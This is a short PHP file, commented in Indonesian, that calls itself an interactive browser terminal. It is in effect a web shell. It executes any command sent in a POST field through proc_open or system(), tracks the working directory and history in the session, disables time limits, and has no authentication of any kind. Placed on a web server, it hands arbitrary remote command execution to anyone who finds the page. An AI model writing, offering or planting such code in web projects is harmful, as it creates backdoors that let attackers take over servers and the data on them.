<?php
// ============================================
// PHP Interactive Terminal - ENI Edition
// Tanpa parameter, full interaktif di browser
// ============================================

set_time_limit(0);
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Session untuk menyimpan history & CWD
session_start();
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

// Handle command
$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    
    if ($cmd === 'clear') {
        $_SESSION['history'] = [];
        $output = '';
    } elseif ($cmd === 'exit') {
        session_destroy();
        die('<html><body style="background:#0a0a0a;color:#0f0;font-family:monospace;padding:20px;">Session terminated.</body></html>');
    } elseif (preg_match('/^cd\s+(.+)$/', $cmd, $m)) {
        // Handle cd command
        $dir = trim($m[1]);
        if ($dir === '~') $dir = getenv('HOME') ?: '/';
        if ($dir[0] !== '/') $dir = $_SESSION['cwd'] . '/' . $dir;
        $real = realpath($dir);
        if ($real && is_dir($real)) {
            $_SESSION['cwd'] = $real;
            chdir($real);
            $output = "Changed directory to: $real";
        } else {
            $output = "cd: no such directory: $dir";
        }
        $_SESSION['history'][] = ['cmd' => $cmd, 'output' => $output, 'time' => date('H:i:s')];
    } else {
        // Execute command
        chdir($_SESSION['cwd']);
        
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        
        $process = proc_open($cmd, $descriptors, $pipes, $_SESSION['cwd']);
        
        if (is_resource($process)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            $ret = proc_close($process);
            
            $output = $stdout;
            if ($stderr) $output .= "\n[STDERR]\n" . $stderr;
            if ($ret !== 0) $output .= "\n[Exit: $ret]";
        } else {
            // Fallback
            ob_start();
            system($cmd, $ret);
            $output = ob_get_clean();
            if ($ret !== 0) $output .= "\n[Exit: $ret]";
        }
        
        $_SESSION['history'][] = [
            'cmd' => $cmd,
            'output' => $output,
            'time' => date('H:i:s')
        ];
        
        // Limit history
        if (count($_SESSION['history']) > 100) {
            array_shift($_SESSION['history']);
        }
    }
}

// Info sistem
$cwd = $_SESSION['cwd'];
$user = function_exists('posix_getpwuid') && function_exists('posix_geteuid') 
    ? posix_getpwuid(posix_geteuid())['name'] 
    : get_current_user();
$host = gethostname();
?>
